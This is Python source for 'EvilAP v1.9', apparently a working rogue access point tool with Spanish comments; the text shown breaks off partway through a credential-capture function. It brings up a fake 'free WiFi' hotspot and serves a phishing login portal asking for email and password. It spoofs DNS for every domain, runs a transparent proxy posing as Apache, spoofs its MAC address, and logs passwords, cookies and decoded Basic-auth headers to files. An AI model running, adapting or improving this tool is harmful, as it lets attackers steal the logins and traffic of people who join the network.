#!/usr/bin/env python3
# =============================================================================
#  EvilAP v1.9
#  Rogue AP + Captive Portal + DNS Spoof + Proxy HTTP Transparente
#
#  FIXES v1.9:
#   1. DNS NUNCA va a 8.8.8.8 -- siempre pasa por dnsmasq local (tuyo)
#      net_allow() ya NO inserta DNAT a 8.8.8.8
#   2. Proxy forward a USER_SRV correcto -- Flask/Nginx recibe TODO
#   3. Modo popup: probes SIEMPRE redirigen al portal (nunca respuesta OK)
#   4. URL personalizada respetada en TODOS los handlers del proxy
#   5. dnsmasq: sin upstream servers en modo wildcard (evita DNS real)
#   6. listen-address explÃ­cito para evitar conflictos de puerto 53
#   7. fix_dns_port() tambiÃ©n mata NetworkManager
#
#  Requiere: hostapd dnsmasq iw ip iptables openssl [arping]
#            pip install prompt_toolkit
# =============================================================================

import os, sys, signal, subprocess, shutil, time, ipaddress
import argparse, threading, re, json, datetime, base64, ssl
from pathlib import Path
from urllib.parse import parse_qs, unquote_plus, urlparse
from http.server import HTTPServer, BaseHTTPRequestHandler
import http.client as _hc

try:
    from prompt_toolkit              import PromptSession
    from prompt_toolkit.completion   import NestedCompleter
    from prompt_toolkit.patch_stdout import patch_stdout
    from prompt_toolkit.formatted_text import HTML
    from prompt_toolkit.styles       import Style
    from prompt_toolkit.history      import InMemoryHistory
except ImportError:
    print("[!] pip install prompt_toolkit"); sys.exit(1)

R  = "\033[91m"; G  = "\033[92m"; Y  = "\033[93m"
B  = "\033[94m"; M  = "\033[95m"; C  = "\033[96m"; W  = "\033[97m"
X  = "\033[0m";  BD = "\033[1m";  DM = "\033[2m"

def banner():
    os.system("clear")
    print(f"""
   ______        _  _   ___   ____
  | ____|_   __ (_)| | / _ \\ |  _ \\
  |  _| \\ \\ / / | || || | | || |_) |
  | |___ \\ V /  | || || |_| ||  __/
  |_____| \\_/   |_||_| \\___/ |_|

  {C}+------[ Rogue AP + Portal + DNS Spoof v1.9 ]----+{X}
  {W}   hostapd | dnsmasq | proxy transparente | iptables {X}
  {C}+------------------------------------------------+{X}
                                        {Y}by Pygramer{X}
""")

# =============================================================================
#  PATHS
# =============================================================================
TMP           = Path("/tmp/evil_ap")
HOSTAPD_CONF  = TMP / "hostapd.conf"
DNSMASQ_CONF  = TMP / "dnsmasq.conf"
DNSMASQ_DYN   = TMP / "dnsmasq_dynamic.conf"
DNSMASQ_LOG   = TMP / "dnsmasq.log"
DNSMASQ_LEASE = TMP / "dnsmasq.leases"
IPTABLES_BAK  = TMP / "iptables_backup.rules"
SSL_CERT      = TMP / "portal.crt"
SSL_KEY       = TMP / "portal.key"
SSL_CERT_CUSTOM = None
SSL_KEY_CUSTOM  = None

_EXEC_DIR    = Path(__file__).resolve().parent
CREDS_LOG    = _EXEC_DIR / "credentials.txt"
CREDS_JSON   = _EXEC_DIR / "credentials.json"
TRAFFIC_JSON = _EXEC_DIR / "traffic.json"

PROXY_PORT = 8888

# =============================================================================
#  ESTADO GLOBAL
# =============================================================================
_lk_clients = threading.Lock()
_lk_creds   = threading.Lock()
_lk_dns     = threading.Lock()
_lk_watch   = threading.Lock()

clients:    dict = {}
all_creds:  list = []
dns_spoof:  dict = {}
_watch_subs: dict = {}

_id_to_ip:  dict = {}
_ip_to_id:  dict = {}
_next_id    = 1
_lk_ids     = threading.Lock()

CLIENT_ACTIVE_SECS = 90

proc_hostapd         = None
proc_dnsmasq         = None
proc_tcpdump         = None
_proxy_server        = None
_portal_server_https = None

AP_IFACE      = None
GW_IP         = "10.0.0.1"
NAT_IFACE     = None
USER_SRV      = None   # host:port del servidor externo (Flask/Nginx)
PORTAL_DOMAIN = None
PORTAL_MODE   = "dns"

_resolved_was_active = False

CRED_RE = re.compile(
    r"(user(name)?|login|email|e-?mail|mail|usr|uname|account|"
    r"pass(word|wd)?|passwd|pwd|secret|pin|token|auth|otp|"
    r"phone|cel|mobile|tel|nip|code|key|hash)",
    re.IGNORECASE
)

_RE_DNS = re.compile(
    r'(\d{2}:\d{2}:\d{2})\s+dnsmasq\[\d+\]:\s+query\[([A-Z6]+)\]\s+(\S+)\s+from\s+([\d.]+)'
)
_RE_DHCP = re.compile(
    r'(\d{2}:\d{2}:\d{2})\s+dnsmasq\[\d+\]:\s+DHCP\s+(ACK|OFFER)\(\S+\)\s+([\d.]+)\s+([\da-f:]+)(?:\s+(\S+))?'
)

_NOISY = frozenset([
    "connectivitycheck","generate_204","gstatic.com","gvt2.com","gvt3.com",
    "pool.ntp.org","safebrowsing","beacons","mtalk.google.com",
    "msftconnecttest","captive.apple.com","detectportal.firefox.com",
    "ocsp.","googleapis.com","apple.com","icloud.com",
])

# =============================================================================
#  PROBE PATHS -- rutas de detecciÃ³n de captive portal por cada OS
#
#  FIX v1.9 MODO DNS:
#    En modo "dns" queremos que el OS crea que hay internet libre
#    (para que NO muestre popup y el usuario navegue normalmente hacia el portal).
#    -> respondemos con la respuesta "correcta" que el OS espera.
#
#  FIX v1.9 MODO POPUP:
#    En modo "popup" queremos que el OS detecte captive portal y muestre el popup.
#    -> SIEMPRE redirigimos al portal, NUNCA damos la respuesta "correcta".
#    -> El proxy maneja esto en _handle(): si PORTAL_MODE=="popup" -> redirect portal.
#
#  Antes el cÃ³digo tenÃ­a los probes mezclados y en modo popup nunca redirigÃ­a
#  correctamente porque _PROBE_OK se usaba en ambos modos.
# =============================================================================
_PROBE_OK = {
    "/generate_204":              (204, "",           b""),
    "/gen_204":                   (204, "",           b""),
    "/hotspot-detect.html":       (200, "text/html",  b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"),
    "/library/test/success.html": (200, "text/html",  b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"),
    "/bag":                       (200, "text/html",  b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"),
    "/connecttest.txt":           (200, "text/plain", b"Microsoft Connect Test"),
    "/ncsi.txt":                  (200, "text/plain", b"Microsoft NCSI"),
    "/redirect":                  (200, "text/plain", b"Microsoft Connect Test"),
    "/connectivity-check":        (200, "text/plain", b""),
    "/ubuntu-connectivity-check": (200, "text/plain", b""),
    "/checkin.php":               (200, "text/plain", b""),
}
_PROBE_PATHS = set(_PROBE_OK.keys())

# =============================================================================
#  HTML DEL PORTAL CAUTIVO INTEGRADO
# =============================================================================
PORTAL_HTML = """\
<!DOCTYPE html><html lang="es"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Portal WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
     background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
     min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:rgba(255,255,255,.07);backdrop-filter:blur(12px);
      border:1px solid rgba(255,255,255,.12);border-radius:18px;
      padding:40px 36px;width:90%;max-width:420px;color:#fff}
h2{text-align:center;font-size:1.5rem;margin-bottom:6px}
.sub{text-align:center;color:rgba(255,255,255,.55);font-size:.9rem;margin-bottom:28px}
label{display:block;font-size:.82rem;margin-bottom:6px;color:rgba(255,255,255,.7)}
input{width:100%;padding:11px 14px;border-radius:9px;border:1px solid rgba(255,255,255,.2);
      background:rgba(255,255,255,.08);color:#fff;font-size:.95rem;margin-bottom:16px}
input::placeholder{color:rgba(255,255,255,.35)}
button{width:100%;padding:13px;border-radius:9px;border:none;
       background:linear-gradient(90deg,#e94560,#c0392b);color:#fff;
       font-size:1rem;font-weight:600;cursor:pointer;margin-top:4px}
.footer{text-align:center;font-size:.75rem;color:rgba(255,255,255,.3);margin-top:20px}
</style></head><body>
<div class="card">
  <h2>&#127760; WiFi Gratuito</h2>
  <p class="sub">Inicia sesion para acceder a Internet</p>
  <form method="POST" action="/login">
    <label>Correo electronico</label>
    <input type="email" name="email" placeholder="tu@correo.com" required>
    <label>Contrasena</label>
    <input type="password" name="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" required>
    <button type="submit">Conectar</button>
  </form>
  <p class="footer">Al conectarte aceptas los terminos de uso</p>
</div></body></html>
"""

PORTAL_SUCCESS_HTML = """\
<!DOCTYPE html><html lang="es"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Conectado</title>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
     background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
     min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);
      border-radius:18px;padding:40px 36px;width:90%;max-width:380px;color:#fff;text-align:center}
.icon{font-size:3rem;margin-bottom:16px}
h2{font-size:1.4rem;margin-bottom:8px}
p{color:rgba(255,255,255,.6);font-size:.9rem}
</style></head><body>
<div class="card">
  <div class="icon">&#9989;</div>
  <h2>Conectado</h2>
  <p>Ya tienes acceso a Internet.<br>Puedes cerrar esta ventana.</p>
</div></body></html>
"""

# =============================================================================
#  UTILIDADES
# =============================================================================
def run(cmd, silent=False):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if not silent and r.returncode != 0 and r.stderr.strip():
        print(f"{R}[!]{X} {r.stderr.strip()[:120]}")
    return r.returncode, r.stdout.strip(), r.stderr.strip()

def ts(fmt="%H:%M:%S"):
    return datetime.datetime.now().strftime(fmt)

def ts_iso():
    return datetime.datetime.now().isoformat(timespec="seconds")

def _valid_ip(v):
    if not v: return None
    try: ipaddress.ip_address(v); return v
    except: return None

def _valid_mac(v):
    return v if re.match(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', v) else None

def _since(ts_float):
    secs = max(0, int(time.time() - ts_float))
    if secs < 60:  return f"{secs}s"
    m = secs // 60; s = secs % 60
    if m < 60:     return f"{m}m {s:02d}s"
    h = m // 60;   m2 = m % 60
    return f"{h}h {m2:02d}m"

def _is_active(info):
    return (time.time() - info.get("last_seen_ts", 0)) < CLIENT_ACTIVE_SECS

def _init_client(ip):
    if ip not in clients:
        now = time.time()
        clients[ip] = {
            "connected_ts": now, "last_seen_ts": now,
            "hostname": "", "mac": "", "os_guess": "",
            "user_agents": [], "dns": [], "http": [], "https": [],
            "creds": [], "headers": {}, "authed": False, "browsing": "",
        }
        _assign_id(ip)

def _assign_id(ip):
    global _next_id
    with _lk_ids:
        if ip not in _ip_to_id:
            _ip_to_id[ip] = _next_id
            _id_to_ip[_next_id] = ip
            _next_id += 1

def _resolve(arg):
    if not arg: return None
    s = arg.lstrip("#")
    if s.isdigit():
        with _lk_ids: return _id_to_ip.get(int(s))
    return _valid_ip(arg)

def _portal_host():
    return PORTAL_DOMAIN if PORTAL_DOMAIN else GW_IP

def _portal_url(path="/portal"):
    return f"http://{_portal_host()}{path}"

def check_root():
    if os.geteuid() != 0:
        print(f"{R}[!] Requiere root{X}"); sys.exit(1)

def check_deps():
    miss = [t for t in ["hostapd","dnsmasq","iw","ip","iptables","openssl"]
            if not shutil.which(t)]
    if miss:
        print(f"{R}[!] Faltan: {', '.join(miss)}{X}")
        print(f"{Y}    apt install {' '.join(miss)}{X}"); sys.exit(1)

def _guess_os(ua):
    ua = ua.lower()
    for kw, name in [("android","Android"),("iphone","iOS"),("ipad","iPadOS"),
                     ("windows","Windows"),("macintosh","macOS"),("linux","Linux"),
                     ("cros","ChromeOS")]:
        if kw in ua: return name
    return ""

# =============================================================================
#  WATCH
# =============================================================================
def _watch_notify(ip, line):
    with _lk_watch:
        cbs = list(_watch_subs.get(ip, []))
    for cb in cbs:
        try: cb(line)
        except: pass

def _watch_subscribe(ip, cb):
    with _lk_watch: _watch_subs.setdefault(ip, []).append(cb)

def _watch_unsubscribe(ip, cb):
    with _lk_watch:
        if ip in _watch_subs:
            try: _watch_subs[ip].remove(cb)
            except: pass

# =============================================================================
#  ARP + LEASES
# =============================================================================
def _parse_leases():
    for lf in [DNSMASQ_LEASE, Path("/var/lib/misc/dnsmasq.leases")]:
        if not lf.exists(): continue
        try:
            for line in lf.read_text().splitlines():
                parts = line.split()
                if len(parts) < 4: continue
                mac  = parts[1]; ip = parts[2]
                host = parts[3].strip('"\'') if parts[3] != "*" else ""
                if not _valid_ip(ip): continue
                with _lk_clients:
                    if ip in clients:
                        if mac  and not clients[ip]["mac"]:      clients[ip]["mac"]      = mac
                        if host and not clients[ip]["hostname"]: clients[ip]["hostname"] = host
        except: pass

def _arp_scan_loop():
    has_arping = bool(shutil.which("arping"))
    while True:
        try:
            rc, out, _ = run("ip neigh show", silent=True)
            if rc == 0:
                for line in out.splitlines():
                    m = re.match(r'([\d.]+)\s+dev\s+\S+\s+lladdr\s+([\da-f:]+)', line)
                    if m:
                        ip, mac = m.group(1), m.group(2)
                        with _lk_clients:
                            if ip in clients and not clients[ip]["mac"]:
                                clients[ip]["mac"] = mac
            _parse_leases()
            if has_arping:
                with _lk_clients:
                    sin_mac = [ip for ip, c in clients.items() if not c["mac"]]
                for ip in sin_mac:
                    rc2, out2, _ = run(
                        f"arping -c 1 -I {AP_IFACE} {ip} 2>/dev/null | grep '\\[' | head -1",
                        silent=True)
                    if rc2 == 0 and out2:
                        m2 = re.search(r'\[([\da-f:]{17})\]', out2, re.I)
                        if m2:
                            with _lk_clients:
                                if ip in clients: clients[ip]["mac"] = m2.group(1).lower()
        except: pass
        time.sleep(8)

def start_arp_scanner():
    threading.Thread(target=_arp_scan_loop, daemon=True).start()
    has = "si" if shutil.which("arping") else "no (apt install arping)"
    print(f"{G}[+]{X} ARP scanner activo  {DM}arping:{has}{X}")

# =============================================================================
#  SELECCION DE INTERFAZ
# =============================================================================
def get_wifi_interfaces():
    sysnet = Path("/sys/class/net")
    names  = sorted(p.name for p in sysnet.iterdir()
                    if (p/"wireless").exists() or (p/"phy80211").exists())
    if not names:
        _, out, _ = run("iwconfig 2>/dev/null", silent=True)
        for line in out.splitlines():
            if "IEEE 802.11" in line:
                n = line.split()[0]
                if n not in names: names.append(n)
    _, iw_out, _ = run("iw dev", silent=True)
    meta = {}; cur = {}
    for line in iw_out.splitlines():
        s = line.strip()
        if   s.startswith("Interface"):
            if cur.get("n"): meta[cur["n"]] = cur
            cur = {"n":s.split()[1],"type":"managed","ssid":None,"ch":None,"mac":None}
        elif s.startswith("type")    and cur: cur["type"] = s.split(None,1)[-1]
        elif s.startswith("ssid")    and cur: cur["ssid"] = s.split(None,1)[-1]
        elif s.startswith("channel") and cur: cur["ch"]   = s.split()[1]
        elif s.startswith("addr")    and cur: cur["mac"]  = s.split()[1]
    if cur.get("n"): meta[cur["n"]] = cur
    result = []
    for name in names:
        info  = meta.get(name, {})
        op    = Path(f"/sys/class/net/{name}/operstate")
        state = op.read_text().strip() if op.exists() else "?"
        mac   = info.get("mac") or ""
        if not mac:
            af = Path(f"/sys/class/net/{name}/address")
            mac = af.read_text().strip() if af.exists() else "??"
        result.append({"name":name,"type":info.get("type","?"),
                       "ssid":info.get("ssid"),"ch":info.get("ch"),
                       "mac":mac,"state":state})
    return result

def select_interface(preselected=None):
    print(f"\n{C}[*] Detectando interfaces WiFi...{X}\n")
    ifaces = get_wifi_interfaces()
    if not ifaces:
        print(f"{R}[!] No se encontraron interfaces WiFi{X}"); sys.exit(1)
    print(f"{W}  #    INTERFAZ   TIPO           ESTADO     SSID                   CH    MAC{X}")
    print("  " + "-"*80)
    for i, f in enumerate(ifaces, 1):
        sc  = G if f["state"]=="up" else Y
        pre = f"{C}{BD}" if (preselected and f["name"]==preselected) else W
        print(f"  {G}{i:<4}{X}{pre}{f['name']:<10}{X}{DM}{f['type']:<15}{X}"
              f"{sc}{f['state']:<10}{X}{C}{(f.get('ssid') or '-'):<23}{X}"
              f"{(f.get('ch') or '-'):<6}{DM}{f['mac']}{X}")
    print()
    if preselected and any(f["name"]==preselected for f in ifaces):
        print(f"{G}[+]{X} Usando: {W}{preselected}{X}\n"); return preselected
    if preselected:
        print(f"{R}[!] '{preselected}' no encontrada{X}\n")
    while True:
        try:
            c = int(input(f"{B}[?]{X} Selecciona [1-{len(ifaces)}]: "))
            if 1 <= c <= len(ifaces): return ifaces[c-1]["name"]
        except (ValueError, KeyboardInterrupt): pass
        print(f"{R}[!] Invalido{X}")

# =============================================================================
#  CONFIGURACION INTERACTIVA
# =============================================================================
def _ask(prompt, default="", ok=None):
    while True:
        raw = input(f"{B}[?]{X} {prompt} [{W}{default}{X}]: ").strip()
        val = raw or default
        if ok is None: return val
        r = ok(val)
        if r is not None: return r
        print(f"{R}[!] Valor invalido{X}")

def configure_ap(args):
    if args.ssid and args.channel and args.hw_mode and args.gateway:
        return {"ssid":args.ssid,"password":args.password or None,
                "channel":int(args.channel),"mode":args.hw_mode,"gateway":args.gateway}
    print(f"\n{C}+------------------------------+\n  CONFIGURACION DEL AP\n+------------------------------+{X}\n")
    ssid = args.ssid or _ask("SSID", "FreeWiFi")
    pwd  = args.password or None
    if not pwd and input(f"{B}[?]{X} Agregar contrasena WPA2? [s/N]: ").strip().lower() == "s":
        while True:
            p = input(f"{B}[?]{X} Password (min 8): ").strip()
            if len(p) >= 8: pwd = p; break
            print(f"{R}[!] Minimo 8{X}")
    ch   = args.channel or _ask("Canal (1-13)", "6",
           ok=lambda v: int(v) if v.isdigit() and 1<=int(v)<=13 else None)
    mode = args.hw_mode or _ask("Modo 802.11 [g/n]", "g",
           ok=lambda v: v.lower() if v.lower() in ("g","n") else None)
    gw   = args.gateway or _ask("IP gateway", "10.0.0.1",
           ok=lambda v: v if _valid_ip(v) else None)
    return {"ssid":ssid,"password":pwd,"channel":int(ch),"mode":mode,"gateway":gw}

def _random_mac():
    import random as _rnd
    b = [_rnd.randint(0,255) for _ in range(6)]
    b[0] = (b[0] & 0xFE) | 0x02
    return ':'.join(f'{x:02x}' for x in b)

def configure_mac(iface, args):
    af  = Path(f"/sys/class/net/{iface}/address")
    cur = af.read_text().strip() if af.exists() else "??"
    if args.mac:
        if args.mac == "keep":   return cur
        if args.mac == "random": return _random_mac()
        if _valid_mac(args.mac): return args.mac
    print(f"\n{C}+------------------------------+\n  MAC SPOOFING\n+------------------------------+{X}\n")
    print(f"  MAC actual: {DM}{cur}{X}")
    print(f"  {G}1{X}  Mantener  {G}2{X}  Aleatoria  {G}3{X}  Manual")
    opt = _ask("Opcion", "1", ok=lambda v: v if v in ("1","2","3") else None)
    if opt == "1": return cur
    if opt == "2":
        mac = _random_mac(); print(f"  {G}[+]{X} MAC aleatoria: {W}{mac}{X}"); return mac
    return _ask("MAC (XX:XX:XX:XX:XX:XX)", "de:ad:be:ef:00:01",
                ok=lambda v: v if _valid_mac(v) else None)

def configure_nat(ap_iface, args):
    if args.nat == "none": return {"enabled":False,"iface":None}
    _, out, _ = run("ip route show default", silent=True)
    uplinks = []
    for line in out.splitlines():
        p = line.split()
        if "dev" in p:
            d = p[p.index("dev")+1]
            if d != ap_iface and d not in uplinks: uplinks.append(d)
    if args.nat and args.nat in uplinks:
        return {"enabled":True,"iface":args.nat}
    if not uplinks:
        print(f"{Y}[!] Sin uplinks. AP aislado.{X}")
        return {"enabled":False,"iface":None}
    print(f"\n{C}+------------------------------+\n  INTERNET SHARING (NAT)\n+------------------------------+{X}\n")
    print(f"  {Y}Internet OFF para todos al conectar. 'allow <ip>' para dar acceso.{X}\n")
    for i, u in enumerate(uplinks, 1):
        op = Path(f"/sys/class/net/{u}/operstate")
        st = op.read_text().strip() if op.exists() else "?"
        print(f"  {G}{i}{X} - {W}{u:<14}{X}[{G if st=='up' else Y}{st}{X}]")
    print()
    if input(f"{B}[?]{X} Configurar NAT? [S/n]: ").strip().lower() == "n":
        return {"enabled":False,"iface":None}
    chosen = uplinks[0]
    if len(uplinks) > 1:
        while True:
            try:
                c = int(input(f"{B}[?]{X} Uplink [1-{len(uplinks)}]: "))
                if 1 <= c <= len(uplinks): chosen = uplinks[c-1]; break
            except (ValueError, KeyboardInterrupt): pass
    return {"enabled":True,"iface":chosen}

def configure_mode(args):
    global PORTAL_MODE
    if args.mode in ("popup","dns"):
        PORTAL_MODE = args.mode; return args.mode
    print(f"\n{C}+------------------------------+\n  MODO DEL PORTAL\n+------------------------------+{X}\n")
    print(f"  {G}1{X}  {W}DNS spoof{X}  -- Sin popup. Mas transparente.")
    print(f"  {G}2{X}  {W}Popup{X}      -- Popup automatico al conectar (iOS/Android/Win).")
    print()
    opt = _ask("Modo", "1", ok=lambda v: v if v in ("1","2") else None)
    PORTAL_MODE = "dns" if opt == "1" else "popup"
    return PORTAL_MODE

def configure_portal_server(gw, args):
    global USER_SRV
    if args.portal_server:
        USER_SRV = args.portal_server
        print(f"{G}[+]{X} Servidor externo: {W}http://{USER_SRV}/{X}"); return
    print(f"\n{C}+------------------------------+\n  SERVIDOR DEL PORTAL\n+------------------------------+{X}\n")
    print(f"  {G}1{X}  Portal integrado  {DM}(HTML incluido en el script){X}")
    print(f"  {G}2{X}  Mi propio servidor {DM}(Flask, Nginx... en otro puerto){X}\n")
    opt = _ask("Opcion", "1", ok=lambda v: v if v in ("1","2") else None)
    if opt == "2":
        USER_SRV = _ask("Tu servidor [host:port]", f"{gw}:5000",
                        ok=lambda v: v if ":" in v and v.rsplit(":",1)[-1].isdigit() else None)
        print(f"{G}[+]{X} Todo el HTTP -> {W}http://{USER_SRV}/{X}")
    else:
        USER_SRV = None
        print(f"{G}[+]{X} Usando portal integrado")

def configure_portal_domain(gw, args):
    global PORTAL_DOMAIN
    if args.portal_domain:
        PORTAL_DOMAIN = args.portal_domain.lower().strip()
        print(f"{G}[+]{X} Dominio del portal: {W}http://{PORTAL_DOMAIN}/portal{X}"); return
    print(f"\n{C}+------------------------------+\n  DOMINIO DEL PORTAL\n+------------------------------+{X}\n")
    print(f"  Ejemplos: {W}wifi.free{X}  {W}portal.hotel.com{X}")
    print(f"  Deja vacio para usar la IP {W}({gw}){X} directamente.\n")
    raw = input(f"{B}[?]{X} Dominio [{W}Enter = usar IP{X}]: ").strip().lower()
    PORTAL_DOMAIN = raw if raw else None
    if PORTAL_DOMAIN:
        print(f"{G}[+]{X} Portal URL: {W}http://{PORTAL_DOMAIN}/portal{X}")
    else:
        print(f"{G}[+]{X} Portal URL: {W}http://{gw}/portal{X}  {DM}(IP directa){X}")

def configure_dns(gw, args):
    spoof_ip = gw
    if args.dns_mode:
        mode_map = {"wildcard":"1","custom":"2","off":"3"}
        return {"mode":mode_map.get(args.dns_mode,"1"),"spoof_ip":spoof_ip,"custom":{}}
    print(f"\n{C}+------------------------------+\n  DNS SPOOFING\n+------------------------------+{X}\n")
    print(f"  {G}1{X} Wildcard  -- todos los dominios -> {W}{spoof_ip}{X}")
    print(f"  {G}2{X} Selectivo -- solo dominios que definas")
    print(f"  {G}3{X} Sin spoof  -- DNS normal (solo registra)")
    mode = _ask("Modo", "1", ok=lambda v: v if v in ("1","2","3") else None)
    custom = {}
    if mode == "2":
        print(f"\n  {Y}Dominios a spoofear (Enter = terminar):{X}")
        while True:
            d = input(f"  + dominio: ").strip().lower()
            if not d: break
            custom[d] = spoof_ip
            print(f"    {C}{d}{X} -> {G}{spoof_ip}{X}")
    with _lk_dns: dns_spoof.update(custom)
    return {"mode":mode,"spoof_ip":spoof_ip,"custom":custom}

# =============================================================================
#  DNSMASQ
#
#  FIX v1.9:
#  - listen-address explÃ­cito para evitar conflicto con systemd-resolved
#  - Modo wildcard (1): SIN upstream servers -- dnsmasq responde Ã©l solo
#    con address=/#/ sin hacer forward a 8.8.8.8 primero
#  - Modo selectivo/off (2/3): CON upstream servers para dominios no spoofed
# =============================================================================
def write_hostapd_conf(iface, cfg):
    wpa = (f"\nwpa=2\nwpa_passphrase={cfg['password']}\n"
           f"wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n") if cfg["password"] else "auth_algs=1\n"
    ht  = "ieee80211n=1\nht_capab=[HT40][SHORT-GI-20][SHORT-GI-40]\n" if cfg["mode"]=="n" else ""
    HOSTAPD_CONF.write_text(
        f"interface={iface}\ndriver=nl80211\nssid={cfg['ssid']}\n"
        f"hw_mode={cfg['mode']}\nchannel={cfg['channel']}\n"
        f"macaddr_acl=0\nignore_broadcast_ssid=0\n{wpa}{ht}"
    )

def _build_dns_lines(mode, spoof_ip, extra):
    lines = f"address=/{PORTAL_DOMAIN}/{GW_IP}\n" if PORTAL_DOMAIN else ""
    if mode == "1":
        # Wildcard: TODOS los dominios -> portal IP
        lines += f"address=/#/{spoof_ip}\n"
        return lines   # â FIX: solo esto, sin upstream
    if mode == "2":
        # Selectivo: solo dominios de captive portal checks + los del usuario
        for d in ["connectivitycheck.gstatic.com","connectivitycheck.android.com",
                  "clients3.google.com","captive.apple.com","msftconnecttest.com",
                  "www.msftconnecttest.com","msftncsi.com","detectportal.firefox.com",
                  "nmcheck.gnome.org","network-test.debian.org"]:
            lines += f"address=/{d}/{spoof_ip}\n"
    for dom, ip in extra.items():
        if f"address=/{dom}/" not in lines:
            lines += f"address=/{dom}/{ip}\n"
    return lines

def write_dnsmasq_conf(iface, ap_cfg, dns_cfg):
    gw  = ap_cfg["gateway"]
    net = gw.rsplit(".",1)[0]
    with _lk_dns:
        DNSMASQ_DYN.write_text(_build_dns_lines(dns_cfg["mode"], dns_cfg["spoof_ip"], dict(dns_spoof)))

    # FIX v1.9: upstream servers SOLO si NO es modo wildcard
    # En wildcard, dnsmasq responde todo Ã©l solo sin consultar a nadie externo
    if dns_cfg["mode"] == "1":
        upstream = ""   # â sin upstream en wildcard
    else:
        upstream = "server=8.8.8.8\nserver=1.1.1.1\n"

    DNSMASQ_CONF.write_text(
        f"interface={iface}\n"
        f"listen-address={gw}\n"          # â FIX: bind explÃ­cito
        f"listen-address=127.0.0.1\n"
        f"bind-interfaces\n"
        f"except-interface=lo\n"
        f"dhcp-range={net}.10,{net}.100,255.255.255.0,12h\n"
        f"dhcp-option=3,{gw}\n"
        f"dhcp-option=6,{gw}\n"
        f"{upstream}"
        f"no-resolv\nno-poll\n"
        f"log-queries\nlog-dhcp\n"
        f"log-facility={DNSMASQ_LOG}\n"
        f"dhcp-leasefile={DNSMASQ_LEASE}\n"
        f"conf-file={DNSMASQ_DYN}\n"
    )

def reload_dnsmasq(dns_cfg):
    global proc_dnsmasq
    with _lk_dns:
        DNSMASQ_DYN.write_text(_build_dns_lines(dns_cfg["mode"], dns_cfg["spoof_ip"], dict(dns_spoof)))
    if proc_dnsmasq and proc_dnsmasq.poll() is None:
        proc_dnsmasq.terminate()
        try: proc_dnsmasq.wait(timeout=3)
        except: pass
    run("pkill -f 'dnsmasq.*evil_ap' 2>/dev/null", silent=True)
    time.sleep(0.3)
    proc_dnsmasq = subprocess.Popen(
        ["dnsmasq","-C",str(DNSMASQ_CONF),"--no-daemon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(0.5)
    ok = proc_dnsmasq.poll() is None
    print(f"  {G if ok else R}[{'+'if ok else '!'}]{X} dnsmasq {'recargado' if ok else 'fallo'}")

# =============================================================================
#  PROXY HTTP TRANSPARENTE (:8888)
#
#  FIX v1.9 -- lÃ³gica de routing:
#
#  MODO DNS:
#    probe paths -> respuesta "correcta" (OS cree que hay internet, no muestra popup)
#    cualquier host -> si no authed: redirect portal
#                   -> si authed Y USER_SRV: forward a USER_SRV (Flask/Nginx)
#                   -> si authed Y sin USER_SRV: forward al host real
#
#  MODO POPUP:
#    probe paths -> SIEMPRE redirect portal (fuerza popup)
#    cualquier host -> si no authed: redirect portal
#                   -> si authed Y USER_SRV: forward a USER_SRV
#                   -> si authed Y sin USER_SRV: forward al host real
#
#  SERVIDOR EXTERNO (USER_SRV):
#    Cuando estÃ¡ configurado, el proxy hace forward de TODOS los requests
#    al servidor externo, pasando el Host original en el header.
#    El servidor externo ve: IP real del cliente en X-Forwarded-For,
#    Host original, path completo, body completo.
# =============================================================================
class TransparentProxyHandler(BaseHTTPRequestHandler):

    server_version = "Apache/2.4"
    sys_version    = ""

    def _ip(self):
        return self.client_address[0]

    def _authed(self, ip):
        with _lk_clients:
            _init_client(ip)
            return clients[ip]["authed"]

    def _hget(self, key):
        kl = key.lower()
        for k in self.headers.keys():
            if k.lower() == kl: return self.headers[k]
        return ""

    def _path_clean(self):
        return self.path.split("?")[0].rstrip("/") or "/"

    def _read_body(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        return self.rfile.read(n) if n > 0 else b""

    def _record(self, ip, method, host, path, status):
        now = time.time()
        ua  = self._hget("User-Agent")
        with _lk_clients:
            _init_client(ip)
            c = clients[ip]
            c["last_seen_ts"] = now
            c["browsing"]     = host
            if ua and ua not in c["user_agents"]:
                c["user_agents"].append(ua)
                og = _guess_os(ua)
                if og and not c["os_guess"]: c["os_guess"] = og
            for h in ["Accept-Language","Cookie","Authorization","Referer","Origin","Content-Type"]:
                v = self._hget(h)
                if v: c["headers"][h] = v[:150]
            c["http"].append({"t":ts(),"method":method,"host":host,"path":path,"status":status})
        if not any(n in host for n in _NOISY):
            line = (f"  {DM}{ts()}{X}  {Y}{ip:<15}{X}  "
                    f"{C}{method:<6}{X}  {W}{host}{X}{DM}{path[:55]}{X}  "
                    f"{G if 200<=status<300 else R}{status}{X}")
            print(line)
            _watch_notify(ip, line)

    def _capture_creds(self, ip, host, path, body=b"", method="GET"):
        qs = urlparse(path).query
        if qs:
            c = _parse_creds(qs)
            if c: save_creds(ip, host, path, c, "HTTP-GET")
        if method in ("POST","PUT","PATCH") and body:
            try:
                c = _parse_creds(body.decode("utf-8","replace"))
                if c: save_creds(ip, host, path, c, "HTTP-POST")
            except: pass
        auth = self._hget("Authorization")
        if auth.startswith("Basic "):
            try:
                dec = base64.b64decode(auth[6:]).decode("utf-8","replace")
                if ":" in dec:
